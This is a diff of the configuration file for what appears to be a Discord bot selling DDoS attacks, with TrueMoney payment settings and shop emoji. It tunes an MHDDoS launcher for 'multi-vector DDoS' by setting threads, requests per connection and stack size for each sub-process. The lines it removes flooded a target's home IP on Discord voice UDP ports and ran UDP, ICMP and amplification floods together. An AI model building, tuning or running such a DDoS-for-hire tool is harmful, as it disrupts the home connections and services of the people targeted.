@@ -1,3 +1,4 @@
+
 # config.py
 import os
 
@@ -5,30 +6,26 @@ BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
 BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 PREFIX = "!"
+
 OWNER_ID = 1488103702488154173
 LOG_CHANNEL_ID = 1557064238940299376
 
 TRUEMONEY_PHONE = "0837751528"
 TRUEMONEY_API_KEY = os.getenv("TM_API_KEY", "")
 
+# MHDDoS
 MHDDOS_PATH = os.getenv("MHDDOS_PATH", "start.py")
 MHDDOS_FULL = os.path.join(BASE_DIR, MHDDOS_PATH)
 MHDDOS_DIR  = os.path.dirname(MHDDOS_FULL)
 MHDDOS_LAUNCHER = os.path.join(BASE_DIR, "mhddos_launcher.py")
 
-# ── Voice stutter attack ──
-# ยิง IP บ้าน target ที่พอร์ต UDP 50000-65535 (Discord voice range)
-VOICE_PORT_MIN = 50000
-VOICE_PORT_MAX = 65535
+# ── Multi-vector DDoS ──
+# 1 device → 3 sub-process (แต่ละตัว 1 method)
+THREADS_PER_SUB_NODE = 200       # threads ต่อ process
+RPC_PER_SUB_NODE     = 128       # requests per connection (L7)
+STACK_SIZE_BYTES     = 256 * 1024  # 256KB stack
 
-# ── Attack power (2GB RAM) ──
-SUB_NODES_PER_DEVICE = 3
-THREADS_PER_SUB_NODE = 400
-RPC_PER_SUB_NODE     = 200
-STACK_SIZE_BYTES     = 512 * 1024
-
-# ── Multi-vector ──
-ENABLE_MULTI_VECTOR = True   # UDP + ICMP + AMP พร้อมกัน
+# ── Respawn ──
 MAX_RESPAWN_ATTEMPTS = 5
 RESPAWN_DELAY        = 2
 
@@ -64,7 +61,7 @@ EMOJI_CONTACT       = "<:1000035915:1559174417097953340>"
 EMOJI_SHOP_HEADER   = "<:1000035915:1559174417097953340>"
 EMOJI_RULES         = "<a:1000038732:1559175829001338980>"
 EMOJI_ALLOWED       = "<a:1000035725:1559279254125019217>"
-EMOJI_BULLET        = "<:1000035904:1559278995374088252>"
+EMOJI_BULLET        = "<a:1000035904:1559278995374088252>"
 EMOJI_MODULE        = "<:1000035866:1559279147648290947>"
 EMOJI_CHOOSE_MODULE = "<:1000038746:1559184363021795369>"
 EMOJI_PICK          = "<a:1000030144:1559280351254151199>"
